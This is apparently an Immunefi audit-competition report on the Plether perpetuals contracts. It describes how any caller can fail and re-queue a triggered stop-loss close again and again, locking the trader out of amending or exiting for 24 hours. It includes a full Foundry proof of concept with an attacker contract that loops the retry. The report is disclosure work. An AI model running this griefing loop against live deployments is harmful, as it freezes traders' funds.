# \#97737 [SC-High] Anyone can keep re-queuing a failing protection close, so its owner cannot amend the limits or exi

**Submitted on Nov 2nd 2026 at 22:46:31 UTC by @marcin37 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97737
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Summary

When a triggered protection's close fails on its owner's financial ceiling, any address can end each attempt and retry it in one transaction. After each, the protection is `Triggered` again with a fresh attempt, but the owner may amend only while it is `Latched` with an empty queue, and an active protection blocks every other order. With release parameters, a 100,000 USDG LONG whose stop-loss gapped past its 600 USDG debit ceiling stayed open through 24 hours of attacker transactions, one per second; the control exits in 2 seconds.

## Root cause

The owner's only remedy, [`amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328), needs a `Latched` protection and no pending order:

```solidity
StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
    revert OrderRouter__PendingOrdersExist();
}
```

[`retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405) checks no owner, and from that same state queues a fresh attempt with the unchanged limits and sets `Triggered`:

```solidity
StoredProtection storage protection = _activeProtection(protectionId);
...
linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
    .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
...
_recordCloseAttempt(protection, linkedOrderId);
```

A failed attempt whose position still matches [relatches](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L675), so failure and retry chain inside one transaction. The owner has no other exit: [`_cancel`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L419) and cancel-and-close accept only `PendingOpen` or `Armed`, and [fresh orders revert](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315) while a protection is active. [DEPLOYMENT.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L420-L421) asks keepers not to "continuously queue the same failing attempt", but keepers are untrusted and nothing enforces it.

Cecuro MED-9's fix added these ceilings and the amendment; here any caller keeps that amendment unreachable. SECURITY.md's router and keeper limitations cover unpaid cleanup and uncancellable intents, not a third party renewing a failing attempt.

## Attack path

Conditions: a triggered protection whose retained ceiling rejects its close. In the PoC a 1% gap past a 0.5% stop-loss means a 1,000 USDG price loss against a 600 USDG gross-debit ceiling. The attacker needs only gas.

1. Deploy a contract whose `cycle` calls `executeOrder` on the live attempt, which fails with `ConstraintViolation` and relatches, then `retryPositionProtectionClose`.
2. Call `cycle` every second, once the new attempt can execute (a later block and a newer Pyth publish time); each call uses about 1.35M gas in the PoC.
3. After every call, the owner's amendment reverts `OrderRouter__ProtectionNotLatched` and a close order reverts `OrderRouter__ProtectionActive`.

When an honest keeper ends an attempt first, the contract only retries (1,440 times in the PoC). The owner gets through only if its amendment lands after an attempt ends and before the attacker's next transaction; the attacker leaves that window empty whenever it ends the attempt itself.

## Impact

**Temporary freezing of funds for at least 24 hours.** While the loop runs, the trader can neither close the position nor reach the 1,455 USDG locked behind it:

| | Control | Attack |
| --- | --- | --- |
| Seconds from trigger to exit | 2 | 86,402 |
| Amendments / close orders rejected | — | 86,400 / 86,400 |

Short of landing an amendment in such a window, the trader cannot end the state: a triggered protection cannot be cancelled, so it lasts until the attacker stops or the position is liquidated, keeping its price and carry exposure meanwhile. A day costs the attacker about 116 billion gas, about 1.2 ETH at Arbitrum's 0.01 gwei minimum base fee, whatever the position's size.

## Recommendation

Let the owner amend the close limits while an attempt is pending, applying them to the next retry, or let only the owner retry after a constraint failure until the limits change. The PoC's attack should then leave the trader able to amend and exit within seconds.


## Proof of Concept

Runs in the competition repository at `a82d4fe` on its `BasePerpTest` fixture (in-scope contracts, mock USDG and Pyth). `setUp` asserts the release risk parameters and execution fee, enters 7M USDG Senior and 3M USDG Junior, opens the trader's 100,000 USDG LONG through `OrderRouter.commitOrder` and `executeOrder`, and creates a 0.5% stop-loss with a 600 USDG gross-debit ceiling.

The price then gaps 1% and a keeper triggers the stop. Control: a keeper fails the close, the trader amends and retries. Attack: for 86,400 one-second ticks (24 hours) the attacker contract ends each attempt and retries, an honest keeper ends every 60th attempt first, and after every attacker transaction the trader's amendment and close order must revert.

Cheatcodes: `vm.prank` for each account's own calls, `vm.roll`/`vm.warp` with mock Pyth ticks, `vm.snapshotState`/`vm.revertToState`, `vm.recordLogs`; mock USDG is minted and the owner sets the release Senior caps. The test needs more than Forge's default gas limit.

## Run

Foundry 1.7.1, with forge-std from the repository's submodule. The first via-IR compile takes about 90 seconds; the test then runs in about 4 minutes.

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# save the code below as packages/perps/test/perps/poc/ProtectionRetryLock.t.sol
FOUNDRY_TEST=test/perps/poc forge test --root packages/perps --match-path test/perps/poc/ProtectionRetryLock.t.sol --gas-limit 500000000000 -vv
```

## Output

```text
Ran 1 test for test/perps/poc/ProtectionRetryLock.t.sol:ProtectionRetryLockTest
[PASS] test_RetryLoopKeepsTraderFromAmendingOrClosing() (gas: 95301812148)
Logs:
  Trader position notional, USDG: 100000.000000
  Trader's gross debit ceiling, USDG: 600.000000
  Price loss of the close at the gap, USDG: 1000.000000
  Trader USDG locked behind the position: 1455.000000
  Attacker transactions, one per second: 86400
  Gas per attacker transaction: 1347507
  Attempts an honest keeper ended first: 1440
  Trader amendments rejected: 86400
  Trader close orders rejected: 86400
  Seconds from trigger to exit, control / attacked: 2 86402
```

## Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

interface IOrderExecution {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory);

}

/// @notice Attacker contract: ends a protection's live close attempt, if any, and queues the next one.
contract RetryLoop {

    IOrderExecution internal immutable router;
    IPositionProtectionActions internal immutable book;

    constructor(
        address router_,
        address book_
    ) {
        router = IOrderExecution(router_);
        book = IPositionProtectionActions(book_);
    }

    function cycle(
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external {
        PositionProtectionTypes.PositionProtectionView memory protection =
            IPositionProtectionViews(address(book)).getPositionProtection(protectionId);
        if (protection.status == PositionProtectionTypes.PositionProtectionStatus.Triggered) {
            router.executeOrder(protection.linkedOrderId, pythUpdateData);
        }
        book.retryPositionProtectionClose(protectionId);
    }

}

/// @notice A trader's stop-loss triggers on a 1% gap and its close fails on the trader's own gross-debit ceiling.
///         Control: a keeper fails the attempt, the trader amends the ceiling, retries, and is out in seconds.
///         Attack: for 24 hours the attacker's contract ends each attempt and queues the next in one transaction
///         per second (an honest keeper processes every 60th attempt first); every amendment and ordinary close by
///         the trader reverts. Release parameters from packages/perps/DEPLOYMENT.md; production OrderRouter.
contract ProtectionRetryLockTest is BasePerpTest {

    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant JUNIOR_LP = address(0x1A01);
    address internal constant TRADER = address(0x7EADE5);
    address internal constant KEEPER = address(0xBEEF);
    address internal constant ATTACKER = address(0xA77AC);

    uint256 internal constant ENTRY = 1e8; // basket mark when the LONG opens
    uint256 internal constant STOP = 1.005e8; // LONG stop-loss: a 0.5% adverse move
    uint256 internal constant GAP = 1.01e8; // first tick after the move, past the stop
    uint256 internal constant SIZE = 100_000e18; // 100,000 USDG notional
    uint256 internal constant MARGIN = 1500e6; // 1.5%, above the 0.2% initial margin
    uint256 internal constant DEBIT_CEILING = 600e6; // loss at the stop (500) plus fees, with headroom
    uint256 internal constant LOCK_SECONDS = 24 hours; // one attacker transaction per second, at each new tick
    uint256 internal constant HONEST_KEEPER_EVERY = 60; // seconds between attempts an honest keeper ends first

    struct Outcome {
        uint256 lockedUsdg;
        uint256 attackerTxs;
        uint256 gasPerAttackerTx;
        uint256 honestKeeperExecutions;
        uint256 rejectedAmendments;
        uint256 rejectedCloses;
        uint256 exitDelay;
    }

    IPositionProtectionActions internal book;
    uint64 internal protectionId;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        _lpDeposit(juniorVault, JUNIOR_LP, 3_000_000e6);
        _lpDeposit(seniorVault, SENIOR_LP, 7_000_000e6);
        book = IPositionProtectionActions(address(router.positionProtectionBook()));

        CfdTypes.RiskParams memory params = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(params.vpiFactor, 0.01e18);
        assertEq(params.maintMarginBps, 10);
        assertEq(params.initMarginBps, 20);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.CAP_PRICE(), 2e8);
        assertTrue(pool.isTradingActive());
        assertFalse(engine.isOracleFrozen() || engine.isFadWindow(), "ordinary live market");

        _fundTrader(TRADER, 5000e6);
        _execute(KEEPER, _traderCommit(_request(SIZE, MARGIN, false)), ENTRY);
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, SIZE, "trader's LONG is open");

        PositionProtectionTypes.PositionProtectionParams memory protection;
        protection.stopLossTriggerPrice = STOP;
        protection.closeLimits = _limits(DEBIT_CEILING);
        _mockPythUpdateData(ENTRY);
        router.updateMarkPrice(_liveTick(ENTRY));
        vm.prank(TRADER);
        protectionId = book.createPositionProtection(protection);
    }

    function test_RetryLoopKeepsTraderFromAmendingOrClosing() public {
        uint256 start = vm.snapshotState();
        Outcome memory control = _run(false);
        vm.revertToState(start);
        Outcome memory attacked = _run(true);

        emit log_named_decimal_uint("Trader position notional, USDG", SIZE * ENTRY / 1e20, 6);
        emit log_named_decimal_uint("Trader's gross debit ceiling, USDG", DEBIT_CEILING, 6);
        emit log_named_decimal_uint("Price loss of the close at the gap, USDG", SIZE * (GAP - ENTRY) / 1e20, 6);
        emit log_named_decimal_uint("Trader USDG locked behind the position", attacked.lockedUsdg, 6);
        emit log_named_uint("Attacker transactions, one per second", attacked.attackerTxs);
        emit log_named_uint("Gas per attacker transaction", attacked.gasPerAttackerTx);
        emit log_named_uint("Attempts an honest keeper ended first", attacked.honestKeeperExecutions);
        emit log_named_uint("Trader amendments rejected", attacked.rejectedAmendments);
        emit log_named_uint("Trader close orders rejected", attacked.rejectedCloses);
        emit log(string.concat(
                "Seconds from trigger to exit, control / attacked: ",
                vm.toString(control.exitDelay),
                " ",
                vm.toString(attacked.exitDelay)
            ));

        assertLe(control.exitDelay, 5, "control: the trader amends and is out within seconds");
        assertEq(attacked.rejectedAmendments, LOCK_SECONDS, "attack: every amendment reverts");
        assertEq(attacked.rejectedCloses, LOCK_SECONDS, "attack: every ordinary close reverts");
        assertGt(attacked.exitDelay, LOCK_SECONDS, "attack: the trader is held for the whole 24 hours");
    }

    function _run(
        bool attack
    ) internal returns (Outcome memory outcome) {
        // The price gaps past the stop and an honest keeper triggers the protection.
        _mockPythUpdateData(GAP);
        bytes[] memory gapTick = _liveTick(GAP);
        vm.prank(KEEPER);
        book.triggerPositionProtection(protectionId, gapTick);
        uint256 triggeredAt = vm.getBlockTimestamp();
        outcome.lockedUsdg =
            clearinghouse.balanceAssets(TRADER) - clearinghouse.getAccountAssetBuckets(TRADER).freeSettlementAssets;

        if (attack) {
            RetryLoop loop = new RetryLoop(address(router), address(book));
            for (uint256 i; i < LOCK_SECONDS; ++i) {
                bool keeperFirst = i % HONEST_KEEPER_EVERY == HONEST_KEEPER_EVERY - 1;
                (uint256 gasUsed, bool amendRejected, bool closeRejected) = this.attackSecond(loop, keeperFirst);
                if (i == 0) {
                    outcome.gasPerAttackerTx = gasUsed;
                }
                ++outcome.attackerTxs;
                if (keeperFirst) {
                    ++outcome.honestKeeperExecutions;
                }
                if (amendRejected) {
                    ++outcome.rejectedAmendments;
                }
                if (closeRejected) {
                    ++outcome.rejectedCloses;
                }
            }
            (uint256 size,,,,,,) = engine.positions(TRADER);
            assertEq(size, SIZE, "the position stayed open throughout");
        }

        // A keeper processes the pending attempt; it fails on the ceiling, the trader amends it and retries.
        uint64 pending = _attempt();
        _startRecordingLogs();
        _execute(KEEPER, pending, GAP);
        assertEq(
            uint8(_verifiedOutcome(router.lifecycleBook(), pending).failedConstraint),
            uint8(OrderV3Types.ConstraintKind.GrossAccountDebit),
            "the close fails on the trader's gross debit ceiling"
        );
        assertTrue(_traderAmends(), "the trader can amend once the protection is latched");
        vm.prank(TRADER);
        uint64 retry = book.retryPositionProtectionClose(protectionId);
        OrderV3Types.ExecutionResult memory result = _execute(KEEPER, retry, GAP);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended close executes");
        (uint256 remaining,,,,,,) = engine.positions(TRADER);
        assertEq(remaining, 0, "trader is out");
        outcome.exitDelay = vm.getBlockTimestamp() - triggeredAt;
    }

    /// @dev One second of the attack, run as its own call so the loop's memory does not grow.
    function attackSecond(
        RetryLoop loop,
        bool honestKeeperFirst
    ) external returns (uint256 gasUsed, bool amendRejected, bool closeRejected) {
        require(msg.sender == address(this));
        bytes[] memory tick = _mockPythUpdateData(GAP);
        uint64 attempt = _attempt();
        if (honestKeeperFirst) {
            vm.prank(KEEPER);
            router.executeOrder(attempt, tick);
        }
        uint256 gasBefore = gasleft();
        vm.prank(ATTACKER);
        loop.cycle(protectionId, tick);
        gasUsed = gasBefore - gasleft();
        assertEq(
            uint8(router.lifecycleBook().terminalOutcome(attempt).reason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "each attempt fails on the trader's ceiling"
        );
        assertEq(router.pendingOrderCounts(TRADER), 1, "a fresh attempt is pending again");

        amendRejected = !_traderAmends();
        OrderV3Types.OrderRequest memory close = _request(SIZE, 0, true);
        vm.prank(TRADER);
        try router.commitOrder(close) {
            closeRejected = false;
        } catch (bytes memory reason) {
            assertEq(bytes4(reason), IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            closeRejected = true;
        }
    }

    function _traderAmends() internal returns (bool) {
        vm.prank(TRADER);
        try book.amendLatchedPositionProtectionCloseLimits(protectionId, _limits(MARGIN)) {
            return true;
        } catch (bytes memory reason) {
            assertEq(bytes4(reason), IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            return false;
        }
    }

    function _attempt() internal view returns (uint64) {
        return IPositionProtectionViews(address(book)).getPositionProtection(protectionId).linkedOrderId;
    }

    function _limits(
        uint256 maxGrossDebit
    ) internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: maxGrossDebit,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _traderCommit(
        OrderV3Types.OrderRequest memory request
    ) internal returns (uint64 orderId) {
        vm.prank(TRADER);
        orderId = router.commitOrder(request);
    }

    function _request(
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory) {
        return OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(router.nextCommitId(), vm.getBlockTimestamp())),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _execute(
        address executor,
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(executor);
        result = router.executeOrder(orderId, update);
    }

    function _liveTick(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(requestId));
        bytes[] memory update = _mockPythUpdateData(ENTRY);
        vm.prank(KEEPER);
        router.settleLpEpoch(update);
        vm.prank(lp);
        vault.claimDeposit(requestId, assets, lp, lp);
    }

}
```

